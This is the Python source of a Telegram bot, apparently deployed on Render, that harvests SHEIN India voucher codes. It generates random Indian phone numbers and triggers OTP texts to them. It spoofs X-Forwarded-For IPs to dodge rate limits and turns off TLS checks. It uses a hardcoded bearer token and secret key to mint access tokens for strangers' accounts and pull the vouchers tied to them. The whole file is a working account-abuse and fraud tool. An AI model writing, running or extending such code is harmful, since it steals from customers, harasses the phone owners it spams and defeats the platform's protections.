#!/usr/bin/env python3
"""
SHEIN Voucher Bot - Telegram Bot Logic
Version: 3.0 - Flask Compatible
"""

import os
import json
import random
import time
import threading
import asyncio
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from dotenv import load_dotenv

# Try to import Telegram modules
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️ Telegram module not installed. Install with: pip install python-telegram-bot")

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=os.getenv('LOG_LEVEL', 'INFO')
)
logger = logging.getLogger(__name__)

class SheinVoucherBot:
    def __init__(self):
        # Bot configuration
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        if not self.bot_token:
            logger.error("❌ TELEGRAM_BOT_TOKEN not found in environment variables!")
            logger.error("Please add TELEGRAM_BOT_TOKEN to your .env file")
        
        # Files configuration
        self.data_dir = "data"
        os.makedirs(self.data_dir, exist_ok=True)
        
        # File paths
        self.nm_file = os.path.join(self.data_dir, "nm.json")
        self.used_file = os.path.join(self.data_dir, "used.json")
        self.failed_file = os.path.join(self.data_dir, "failed.json")
        self.vouchers_file = os.path.join(self.data_dir, "vouchers.json")
        self.users_file = os.path.join(self.data_dir, "users.json")
        self.log_file = os.path.join(self.data_dir, "bot.log")
        
        # Performance settings
        self.max_workers = int(os.getenv('MAX_WORKERS', '20'))
        self.request_timeout = int(os.getenv('REQUEST_TIMEOUT', '12'))
        
        # Continuous mode settings
        self.continuous_mode = {}
        self.continuous_stats = {}
        self.stop_continuous = {}
        
        # Load data
        self.load_all_data()
        
        # Thread pool for parallel processing
        self.executor = ThreadPoolExecutor(max_workers=self.max_workers)
        
        # URLs
        self.send_otp_url = "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck"
        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        self.user_data_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
        
        # Headers
        self.otp_headers = {
            "X-Tenant": "B2C",
            "Accept": "application/json",
            "User-Agent": "Android",
            "client_type": "Android/35",
            "client_version": "1.0.12",
            "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzE3ODE4MDQsImlhdCI6MTc2OTE4OTgwNH0.HsDutIjo9XEnC6Ju1_MZsjj3v-T52_2K4L0RKdnsNncEAjlNEA4MDEA39yLiGdaDzvNSmAy3fKgQcWE_WTC0RvPhL4_F9bzAFoK6LASjb1LzOKilHAdlFQtUDfZPgCdq9iXg95-v2-qv3vjoF2K47I7i9v_v8EKXO_OfqQILDyBzIqumYE3VRpDG1zJhIUijuDkmIrfsz8w-0m40gccXfsnN5IeRwp_l98l-amUfDs1bI167oWEBi-gGby7Fqzku8FxCicZ17cwhiWTs8kzopkKP1H50cFMBmH7cZR-WNbM_0OBdj4IcxT-2jHm-qoqMCGykud33KFLU2PfS8VU45g",
            "X-TENANT-ID": "SHEIN",
            "ad_id": self.generate_ad_id(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip",
            "Connection": "keep-alive"
        }
        
        # Thread safety
        self.lock = threading.Lock()
        self.active_sessions = {}
        
        # Bot status
        self.is_running = True
        
        logger.info(f"✅ Bot initialized with {self.max_workers} workers")
    
    def generate_ad_id(self):
        """Generate fresh ad_id for each request"""
        import uuid
        return str(uuid.uuid4())
    
    def load_all_data(self):
        """Load all data files"""
        self.numbers = self.load_json(self.nm_file, [])
        self.used = self.load_json(self.used_file, [])
        self.failed = self.load_json(self.failed_file, [])
        self.vouchers = self.load_json(self.vouchers_file, [])
        self.users = self.load_json(self.users_file, {})
        
        logger.info(f"📊 Data loaded: {len(self.numbers)} numbers, {len(self.vouchers)} vouchers, {len(self.users)} users")
    
    def load_json(self, filename, default):
        """Load JSON file or return default"""
        try:
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {filename}: {e}")
        return default
    
    def save_json(self, filename, data):
        """Save data to JSON file"""
        try:
            with self.lock:
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error saving {filename}: {e}")
    
    def generate_valid_indian_number(self):
        """Generate valid Indian mobile numbers"""
        prefixes = ['70', '71', '72', '73', '74', '75', '76', '77', '78', '79',
                   '80', '81', '82', '83', '84', '85', '86', '87', '88', '89',
                   '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
        
        prefix = random.choice(prefixes)
        number = prefix + ''.join([str(random.randint(0, 9)) for _ in range(8)])
        return number
    
    def random_ip(self):
        """Generate random IP address"""
        return f"{random.randint(100, 200)}.{random.randint(10, 200)}.{random.randint(10, 200)}.{random.randint(10, 250)}"
    
    def send_otp(self, number):
        """Send OTP to number"""
        try:
            import requests
            
            headers = self.otp_headers.copy()
            headers["ad_id"] = self.generate_ad_id()
            headers["X-Forwarded-For"] = self.random_ip()
            
            data = f"mobileNumber={number}"
            
            response = requests.post(
                self.send_otp_url,
                data=data,
                headers=headers,
                timeout=8,
                verify=False
            )
            
            if response and response.status_code == 200:
                try:
                    result = response.json()
                    if result.get("success") is True:
                        return True, number, "success"
                except:
                    pass
            
            return False, number, "failed"
            
        except Exception as e:
            logger.debug(f"OTP failed for {number}: {e}")
            return False, number, "error"
    
    def get_client_token(self):
        """Get client token"""
        import requests
        import hashlib
        import time
        
        device_id = hashlib.md5(f"android-{int(time.time())}".encode()).hexdigest().upper()
        ip = self.random_ip()
        
        headers = {
            "Client_type": "Android/29",
            "Client_version": "1.0.8",
            "User-Agent": "Android",
            "X-Tenant-Id": "shein",
            "Ad_id": device_id,
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
        
        try:
            response = requests.post(
                self.client_token_url,
                data=data,
                headers=headers,
                timeout=10,
                verify=False
            )
            
            if response and response.status_code == 200:
                try:
                    return response.json()['access_token']
                except:
                    pass
        except:
            pass
        
        return None
    
    def check_account(self, mobile, client_token):
        """Check account"""
        import requests
        
        ip = self.random_ip()
        
        headers = {
            "Authorization": f"Bearer {client_token}",
            "Client_type": "Android/29",
            "Client_version": "1.0.8",
            "User-Agent": "Android",
            "X-Tenant-Id": "shein",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = f"mobileNumber={mobile}"
        
        try:
            response = requests.post(
                self.account_check_url,
                data=data,
                headers=headers,
                timeout=8,
                verify=False
            )
            
            if response and response.status_code == 200:
                try:
                    return response.json()['encryptedId']
                except:
                    pass
        except:
            pass
        
        return None
    
    def get_creator_token(self, mobile, encrypted_id):
        """Get creator token"""
        import requests
        
        ip = self.random_ip()
        
        headers = {
            "Content-Type": "application/json",
            "X-Tenant-Id": "shein",
            "User-Agent": "Android",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = {
            "client_type": "Android/29",
            "client_version": "1.0.8",
            "gender": random.choice(["MALE", "FEMALE"]),
            "phone_number": mobile,
            "secret_key": "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            "user_id": encrypted_id,
            "user_name": random.choice(["Aarav", "Ankit", "Rahul", "Rohit", "Aman"])
        }
        
        try:
            response = requests.post(
                self.creator_token_url,
                data=json.dumps(data),
                headers=headers,
                timeout=10,
                verify=False
            )
            
            if response and response.status_code == 200:
                try:
                    return response.json()['access_token']
                except:
                    pass
        except:
            pass
        
        return None
    
    def get_voucher(self, mobile, encrypted_id, creator_token):
        """Get voucher data"""
        import requests
        
        ip = self.random_ip()
        
        headers = {
            "Authorization": f"Bearer {creator_token}",
            "X-Encrypted-Id": encrypted_id,
            "Origin": "https://sheinverse.galleri5.com",
            "Referer": "https://sheinverse.galleri5.com/",
            "User-Agent": "Android",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        try:
            response = requests.get(
                self.user_data_url,
                headers=headers,
                timeout=10,
                verify=False
            )
            
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if 'user_data' in data and 'voucher_data' in data['user_data']:
                        voucher_data = data['user_data']['voucher_data']
                        return {
                            "mobile": mobile,
                            "voucher_code": voucher_data.get('voucher_code', 'N/A'),
                            "amount": voucher_data.get('voucher_amount', 'N/A'),
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                except:
                    pass
        except:
            pass
        
        return None
    
    def find_valid_number(self):
        """Find a single valid number"""
        for _ in range(3):  # Try 3 different numbers
            number = self.generate_valid_indian_number()
            success, number, status = self.send_otp(number)
            if success:
                # Save to database
                if number not in self.numbers:
                    self.numbers.append(number)
                    self.save_json(self.nm_file, self.numbers)
                return True, number
            time.sleep(0.5)
        return False, None
    
    def process_number_for_voucher(self, mobile):
        """Process a single number to get voucher"""
        try:
            client_token = self.get_client_token()
            if not client_token:
                return None
            
            encrypted_id = self.check_account(mobile, client_token)
            if not encrypted_id:
                return None
            
            creator_token = self.get_creator_token(mobile, encrypted_id)
            if not creator_token:
                return None
            
            voucher = self.get_voucher(mobile, encrypted_id, creator_token)
            if voucher:
                logger.info(f"✅ Found voucher for {mobile}: {voucher['voucher_code']}")
            return voucher
            
        except Exception as e:
            logger.debug(f"Error processing {mobile}: {e}")
            return None
    
    # Telegram Bot Handlers
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        
        # Save user
        user_id = str(user.id)
        if user_id not in self.users:
            self.users[user_id] = {
                "username": user.username,
                "first_name": user.first_name,
                "join_date": datetime.now().isoformat(),
                "total_vouchers": 0,
                "total_value": 0,
                "last_active": datetime.now().isoformat()
            }
            self.save_json(self.users_file, self.users)
        
        # Create menu
        keyboard = [
            [InlineKeyboardButton("🚀 Start Continuous Mode", callback_data="start_continuous")],
            [InlineKeyboardButton("⚡ Quick Batch", callback_data="quick_batch")],
            [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
            [InlineKeyboardButton("🎫 My Vouchers", callback_data="my_vouchers")],
            [InlineKeyboardButton("❓ Help", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🎫 *SHEIN Voucher Bot*\n\n"
            "⚡ *Continuous Auto-Collection*\n\n"
            "Bot runs 24/7 on Render Cloud!\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline button clicks"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(update.effective_user.id)
        
        if query.data == "start_continuous":
            await self.start_continuous_mode(query, user_id)
        elif query.data == "quick_batch":
            await self.quick_batch_mode(query, user_id)
        elif query.data == "stats":
            await self.show_stats(query)
        elif query.data == "my_vouchers":
            await self.show_user_vouchers(query, user_id)
        elif query.data == "help":
            await self.show_help(query)
        elif query.data == "back_menu":
            await self.show_menu(query)
        elif query.data == "stop_continuous":
            await self.stop_continuous_mode(query, user_id)
    
    async def start_continuous_mode(self, query, user_id):
        """Start continuous auto-collection"""
        if self.continuous_mode.get(user_id, False):
            await query.edit_message_text(
                "🟢 *Already Running*\n\n"
                "Auto-collection is already active!",
                parse_mode="Markdown"
            )
            return
        
        # Initialize stats
        self.continuous_stats[user_id] = {
            "start_time": time.time(),
            "total_attempts": 0,
            "valid_numbers": 0,
            "vouchers_found": 0,
            "total_value": 0
        }
        
        # Set continuous mode
        self.continuous_mode[user_id] = True
        self.stop_continuous[user_id] = False
        
        await query.edit_message_text(
            "🚀 *Starting Continuous Mode*\n\n"
            "Bot is now running in background!\n"
            "It will continuously:\n"
            "1. Find valid numbers\n"
            "2. Fetch vouchers\n"
            "3. Save to your account\n"
            "4. Repeat automatically\n\n"
            "⏳ Starting first batch...",
            parse_mode="Markdown"
        )
        
        # Start continuous process
        asyncio.create_task(self.run_continuous_mode(query, user_id))
    
    async def run_continuous_mode(self, query, user_id):
        """Run continuous auto-collection"""
        try:
            batch_counter = 0
            
            while self.continuous_mode.get(user_id, False) and not self.stop_continuous.get(user_id, False):
                batch_counter += 1
                
                # Find a valid number
                success, number = self.find_valid_number()
                self.continuous_stats[user_id]["total_attempts"] += 1
                
                if success:
                    self.continuous_stats[user_id]["valid_numbers"] += 1
                    
                    # Process for voucher
                    voucher = self.process_number_for_voucher(number)
                    
                    if voucher:
                        self.continuous_stats[user_id]["vouchers_found"] += 1
                        try:
                            amount_str = str(voucher['amount']).replace('₹', '').strip()
                            if amount_str.lower() != 'n/a':
                                self.continuous_stats[user_id]["total_value"] += float(amount_str)
                        except:
                            pass
                        
                        # Save voucher
                        self.vouchers.append(voucher)
                        self.used.append(number)
                        
                        # Save files
                        self.save_json(self.vouchers_file, self.vouchers)
                        self.save_json(self.used_file, self.used)
                        
                        # Update user stats
                        if user_id in self.users:
                            self.users[user_id]["total_vouchers"] += 1
                            try:
                                amount_str = str(voucher['amount']).replace('₹', '').strip()
                                if amount_str.lower() != 'n/a':
                                    self.users[user_id]["total_value"] += float(amount_str)
                            except:
                                pass
                            self.save_json(self.users_file, self.users)
                        
                        # Send notification
                        await self.send_voucher_notification(query, user_id, voucher)
                
                # Update status every 5 batches
                if batch_counter % 5 == 0:
                    await self.update_continuous_status(query, user_id, batch_counter)
                
                # Small delay
                await asyncio.sleep(0.5)
            
            # Cleanup
            await self.continuous_mode_ended(query, user_id)
            
        except Exception as e:
            logger.error(f"Continuous mode error: {e}")
            await query.edit_message_text(
                "❌ *Auto-Collection Error*\n\n"
                "An error occurred. Stopped.",
                parse_mode="Markdown"
            )
            self.continuous_mode[user_id] = False
    
    async def update_continuous_status(self, query, user_id, batch_counter):
        """Update status"""
        if user_id not in self.continuous_stats:
            return
        
        stats = self.continuous_stats[user_id]
        elapsed = time.time() - stats["start_time"]
        
        status_msg = (
            f"🔄 *Auto-Collection Running*\n\n"
            f"⏱️ Time: {int(elapsed // 60)}m {int(elapsed % 60)}s\n"
            f"🔢 Attempts: {stats['total_attempts']}\n"
            f"✅ Valid: {stats['valid_numbers']}\n"
            f"🎫 Vouchers: {stats['vouchers_found']}\n"
            f"💰 Value: ₹{stats['total_value']}\n\n"
            f"*Status: RUNNING*"
        )
        
        keyboard = [
            [InlineKeyboardButton("⏹️ Stop", callback_data="stop_continuous")],
            [InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await query.edit_message_text(
                status_msg,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        except:
            pass
    
    async def send_voucher_notification(self, query, user_id, voucher):
        """Send notification for voucher"""
        try:
            notification = (
                f"🎉 *New Voucher Found!*\n\n"
                f"✅ Code: `{voucher['voucher_code']}`\n"
                f"💰 Amount: `₹{voucher['amount']}`\n"
                f"⏰ Time: `{voucher['timestamp']}`\n\n"
                f"Auto-collection continues..."
            )
            
            await query.message.reply_text(
                notification,
                parse_mode="Markdown"
            )
        except:
            pass
    
    async def continuous_mode_ended(self, query, user_id):
        """Handle end of continuous mode"""
        if user_id in self.continuous_stats:
            stats = self.continuous_stats[user_id]
            
            final_msg = (
                f"⏹️ *Auto-Collection Stopped*\n\n"
                f"📊 Final Stats:\n"
                f"• Attempts: {stats['total_attempts']}\n"
                f"• Valid Numbers: {stats['valid_numbers']}\n"
                f"• Vouchers Found: {stats['vouchers_found']}\n"
                f"• Total Value: ₹{stats['total_value']}\n\n"
                f"All vouchers saved!"
            )
            
            keyboard = [
                [InlineKeyboardButton("🚀 Start Again", callback_data="start_continuous")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await query.edit_message_text(
                    final_msg,
                    reply_markup=reply_markup,
                    parse_mode="Markdown"
                )
            except:
                await query.message.reply_text(
                    final_msg,
                    reply_markup=reply_markup,
                    parse_mode="Markdown"
                )
            
            # Cleanup
            if user_id in self.continuous_stats:
                del self.continuous_stats[user_id]
        
        self.continuous_mode[user_id] = False
        if user_id in self.stop_continuous:
            del self.stop_continuous[user_id]
    
    async def stop_continuous_mode(self, query, user_id):
        """Stop continuous mode"""
        self.stop_continuous[user_id] = True
        
        await query.edit_message_text(
            "🛑 *Stopping...*\n\n"
            "Please wait...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(2)
        await self.continuous_mode_ended(query, user_id)
    
    async def quick_batch_mode(self, query, user_id):
        """Quick batch mode"""
        await query.edit_message_text(
            "⚡ *Quick Batch Mode*\n\n"
            "Processing 5 numbers...",
            parse_mode="Markdown"
        )
        
        vouchers_found = []
        
        for i in range(5):
            success, number = self.find_valid_number()
            if success:
                voucher = self.process_number_for_voucher(number)
                if voucher:
                    vouchers_found.append(voucher)
                    self.vouchers.append(voucher)
                    self.used.append(number)
            
            await query.edit_message_text(
                f"⚡ *Processing...*\n\n"
                f"Progress: {i + 1}/5\n"
                f"Found: {len(vouchers_found)} vouchers",
                parse_mode="Markdown"
            )
            
            await asyncio.sleep(0.5)
        
        # Save
        self.save_json(self.vouchers_file, self.vouchers)
        self.save_json(self.used_file, self.used)
        
        if vouchers_found:
            result_text = "\n".join([f"• `{v['voucher_code']}` (₹{v['amount']})" for v in vouchers_found])
            
            result_msg = (
                f"✅ *Quick Batch Complete!*\n\n"
                f"Found: {len(vouchers_found)} vouchers\n\n"
                f"*Vouchers:*\n{result_text}"
            )
            
            keyboard = [
                [InlineKeyboardButton("🚀 Continuous Mode", callback_data="start_continuous")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                result_msg,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            keyboard = [
                [InlineKeyboardButton("🚀 Try Continuous Mode", callback_data="start_continuous")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "📭 *No Vouchers Found*\n\n"
                "Try continuous mode for better results.",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
    
    async def show_stats(self, query):
        """Show statistics"""
        total_value = 0
        for v in self.vouchers:
            try:
                amount_str = str(v['amount']).replace('₹', '').strip()
                if amount_str.lower() != 'n/a':
                    total_value += float(amount_str)
            except:
                pass
        
        stats_text = (
            "📊 *Bot Statistics*\n\n"
            f"• Total Vouchers: `{len(self.vouchers)}`\n"
            f"• Total Value: `₹{total_value}`\n"
            f"• Total Users: `{len(self.users)}`\n"
            f"• Numbers in DB: `{len(self.numbers)}`\n\n"
            "*Recent Vouchers:*\n"
        )
        
        recent = self.vouchers[-5:] if self.vouchers else []
        for v in recent:
            stats_text += f"• `{v['voucher_code']}` (₹{v['amount']})\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            stats_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def show_user_vouchers(self, query, user_id):
        """Show user vouchers"""
        user_data = self.users.get(user_id, {})
        
        if not user_data or user_data.get("total_vouchers", 0) == 0:
            keyboard = [
                [InlineKeyboardButton("🚀 Start Collecting", callback_data="start_continuous")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "📭 *No Vouchers Yet*\n\n"
                "Start collecting to see vouchers here!",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            return
        
        recent = self.vouchers[-10:]
        voucher_text = "\n".join([f"• `{v['voucher_code']}` (₹{v['amount']})" for v in recent[:5]])
        
        user_text = (
            f"👤 *Your Account*\n\n"
            f"Total Vouchers: `{user_data.get('total_vouchers', 0)}`\n"
            f"Total Value: `₹{user_data.get('total_value', 0)}`\n\n"
            f"*Recent Vouchers:*\n{voucher_text}"
        )
        
        keyboard = [
            [InlineKeyboardButton("🚀 Collect More", callback_data="start_continuous")],
            [InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            user_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def show_help(self, query):
        """Show help"""
        help_text = (
            "🤖 *SHEIN Voucher Bot*\n\n"
            "*How to Use:*\n"
            "1. Start Continuous Mode\n"
            "2. Bot runs automatically\n"
            "3. Get voucher notifications\n"
            "4. Stop when you want\n\n"
            "*Commands:*\n"
            "/start - Main menu\n"
            "/stats - Statistics\n"
            "/help - This message"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Menu", callback_data="back_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            help_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def show_menu(self, query):
        """Show menu"""
        keyboard = [
            [InlineKeyboardButton("🚀 Start Continuous Mode", callback_data="start_continuous")],
            [InlineKeyboardButton("⚡ Quick Batch", callback_data="quick_batch")],
            [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
            [InlineKeyboardButton("🎫 My Vouchers", callback_data="my_vouchers")],
            [InlineKeyboardButton("❓ Help", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🎫 *SHEIN Voucher Bot*\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    def setup_bot(self):
        """Setup Telegram bot"""
        if not TELEGRAM_AVAILABLE:
            raise ImportError("python-telegram-bot not installed")
        
        if not self.bot_token:
            raise ValueError("TELEGRAM_BOT_TOKEN not set")
        
        application = Application.builder().token(self.bot_token).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.start_command))
        application.add_handler(CommandHandler("stats", self.stats_command))
        application.add_handler(CommandHandler("help", self.help_command))
        
        # Callback handlers
        application.add_handler(CallbackQueryHandler(self.button_handler))
        
        return application
    
    async def run(self):
        """Run the bot"""
        try:
            application = self.setup_bot()
            
            # Print banner
            print("\n" + "="*50)
            print("🎫 SHEIN Voucher Bot - Flask Edition")
            print("⚡ Running on Render Cloud")
            print("="*50)
            print(f"📊 Users: {len(self.users)}")
            print(f"🎫 Vouchers: {len(self.vouchers)}")
            print(f"📱 Numbers: {len(self.numbers)}")
            print("="*50)
            print("✅ Bot started successfully!")
            print("🌐 Web Interface: https://your-app.onrender.com")
            print("="*50)
            
            # Start polling
            await application.initialize()
            await application.start()
            await application.updater.start_polling()
            
            # Keep running
            while self.is_running:
                await asyncio.sleep(1)
                
        except Exception as e:
            logger.error(f"Bot error: {e}")
            raise